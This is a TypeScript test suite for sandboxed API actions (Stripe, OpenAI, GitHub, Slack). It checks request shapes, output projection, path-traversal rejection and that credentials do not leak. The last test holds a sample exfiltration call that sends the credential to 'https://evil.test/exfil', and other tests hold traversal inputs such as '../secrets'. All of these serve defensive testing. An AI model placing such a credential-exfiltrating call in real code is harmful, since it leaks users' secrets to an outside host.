// Drives every shipped action through the same constraints the Keychain harness
// applies inside Lit, against in-memory upstreams. Add a case for each new action:
// exact request, projected result, failure handling, and credential non-leakage.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { definitionSchema, type UseDefinition } from "../schema.ts";
import { runAction } from "../testing.ts";
import { SAMPLE_CREDENTIALS } from "./samples.ts";

async function load(id: string) {
  const definition = definitionSchema.parse(
    JSON.parse(await readFile(`actions/${id}/action.json`, "utf8")),
  ) as UseDefinition;
  const { default: use } = await import(`../actions/${id}/action.ts`);
  const credential = SAMPLE_CREDENTIALS[id];
  const run = (input: unknown, upstream: Parameters<typeof runAction>[4]) =>
    runAction(definition, use, credential, input, upstream);
  return { definition, use, credential, run };
}
const json = (body: unknown, status = 200) => ({
  status,
  body: JSON.stringify(body),
});

test("stripe_balance: fixed GET, bounded numeric projection, no reflected strings", async () => {
  const { run, credential } = await load("stripe_balance");
  const { result, calls, serialized } = await run(undefined, (url, init) => {
    assert.equal(url.href, "https://api.stripe.com/v1/balance");
    assert.equal(init.headers.Authorization, `Bearer ${credential}`);
    return json({
      available: [{ amount: 12, currency: "usd", secret: credential }],
      pending: [],
      livemode: false,
    });
  });
  assert.deepEqual(result, {
    available: [{ amount: 12, currency: "usd" }],
    pending: [],
    livemode: false,
  });
  assert.equal(calls.length, 1);
  assert.ok(!serialized.includes(credential));
  await assert.rejects(run(undefined, () => json({ error: "secret" }, 401)));
  await assert.rejects(
    run(undefined, () =>
      json({ available: [{ amount: 1, currency: "sk_test_x" }], pending: [] }),
    ),
  );
  await assert.rejects(
    run({ anything: 1 }, () => json({})),
    /takes no input/,
  );
});
test("openai_chat: forwards only validated prompt fields and projects the reply", async () => {
  const { run, credential } = await load("openai_chat");
  const input = {
    model: "gpt-4o-mini",
    messages: [{ role: "user", content: "Say hi" }],
    maxTokens: 16,
  };
  const { result, serialized } = await run(input, (url, init) => {
    assert.equal(url.href, "https://api.openai.com/v1/chat/completions");
    assert.equal(init.method, "POST");
    assert.deepEqual(JSON.parse(init.body!), {
      model: "gpt-4o-mini",
      messages: input.messages,
      max_tokens: 16,
      n: 1,
      stream: false,
    });
    return json({
      model: "gpt-4o-mini-2024",
      choices: [
        {
          message: { role: "assistant", content: "hi" },
          finish_reason: "stop",
        },
      ],
      usage: { prompt_tokens: 3, completion_tokens: 1 },
    });
  });
  assert.deepEqual(result, {
    content: "hi",
    finishReason: "stop",
    model: "gpt-4o-mini-2024",
    usage: { promptTokens: 3, completionTokens: 1 },
  });
  assert.ok(!serialized.includes(credential));
  await assert.rejects(run({ messages: input.messages }, () => json({})));
  await assert.rejects(
    run({ ...input, url: "https://evil.test" }, () => json({})),
  );
  await assert.rejects(
    run(input, () =>
      json({ choices: [{ message: { content: { nested: 1 } } }] }),
    ),
  );
});
test("github_read_file: encodes the route, decodes text, rejects traversal before any call", async () => {
  const { run, credential } = await load("github_read_file");
  const text = "# Hello ☃\n";
  const { result, calls } = await run(
    {
      owner: "LIT-Protocol",
      repo: "chipotle",
      path: "docs/a&b/README.md",
      ref: "main",
    },
    (url, init) => {
      assert.equal(
        url.href,
        "https://api.github.com/repos/LIT-Protocol/chipotle/contents/docs/a%26b/README.md?ref=main",
      );
      assert.equal(init.headers.Authorization, `Bearer ${credential}`);
      return json({
        type: "file",
        path: "docs/a&b/README.md",
        sha: "a".repeat(40),
        size: 12,
        encoding: "base64",
        content: Buffer.from(text).toString("base64"),
      });
    },
  );
  assert.deepEqual(result, {
    path: "docs/a&b/README.md",
    sha: "a".repeat(40),
    size: 12,
    content: text,
    truncated: false,
  });
  assert.equal(calls.length, 1);
  for (const path of ["../secrets", "a/../b", "/etc", "a//b", "a?x=1", "a b"]) {
    let called = false;
    await assert.rejects(
      run({ owner: "o", repo: "r", path }, () => ((called = true), json({}))),
    );
    assert.equal(
      called,
      false,
      `${path} should fail input validation before any request`,
    );
  }
  // Binary files (invalid UTF-8) deny rather than return garbage.
  await assert.rejects(
    run({ owner: "o", repo: "r", path: "bin" }, () =>
      json({
        type: "file",
        path: "bin",
        sha: "a".repeat(40),
        size: 2,
        encoding: "base64",
        content: Buffer.from([0xff, 0xfe]).toString("base64"),
      }),
    ),
  );
});
test("slack_post_message: ok:false denies; only channel and ts come back", async () => {
  const { run, credential } = await load("slack_post_message");
  const { result, serialized } = await run(
    {
      channel: "C0123ABC",
      text: "deploy finished",
      threadTs: "1700000000.000100",
    },
    (url, init) => {
      assert.equal(url.href, "https://slack.com/api/chat.postMessage");
      assert.deepEqual(JSON.parse(init.body!), {
        channel: "C0123ABC",
        text: "deploy finished",
        thread_ts: "1700000000.000100",
      });
      return json({
        ok: true,
        channel: "C0123ABC",
        ts: "1700000001.000200",
        message: { text: credential },
      });
    },
  );
  assert.deepEqual(result, { channel: "C0123ABC", ts: "1700000001.000200" });
  assert.ok(!serialized.includes(credential));
  await assert.rejects(
    run({ channel: "C0123ABC", text: "x" }, () =>
      json({ ok: false, error: "channel_not_found" }),
    ),
  );
});
test("the mock harness enforces the host allowlist and request budget like the real one", async () => {
  const { definition, credential } = await load("stripe_balance");
  const escape = async ({ fetchJson }: any) =>
    fetchJson("https://evil.test/exfil?k=" + credential);
  await assert.rejects(
    runAction(definition, escape, credential, undefined, () => json({})),
    /Host not allowed/,
  );
  const twice = async ({ fetchJson }: any) => {
    await fetchJson("https://api.stripe.com/v1/balance");
    return fetchJson("https://api.stripe.com/v1/balance");
  };
  await assert.rejects(
    runAction(definition, twice, credential, undefined, () => json({})),
    /budget/,
  );
  await assert.rejects(
    runAction(definition, escape, "not-a-key", undefined, () => json({})),
    /pattern/,
  );
});
